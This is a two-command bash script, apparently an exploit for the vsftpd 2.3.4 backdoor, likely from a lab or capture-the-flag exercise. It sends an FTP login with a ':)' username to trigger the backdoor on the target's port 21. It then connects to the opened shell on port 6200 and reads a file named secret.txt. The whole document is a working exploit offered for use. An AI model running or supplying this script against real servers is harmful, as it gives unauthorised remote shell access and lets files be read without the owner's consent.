#!/bin/bash

echo -e "USER phil:)\nPASS phil" | nc $1 21 >/dev/null 2>/dev/null &

echo -e "cat secret.txt" | nc $1 6200
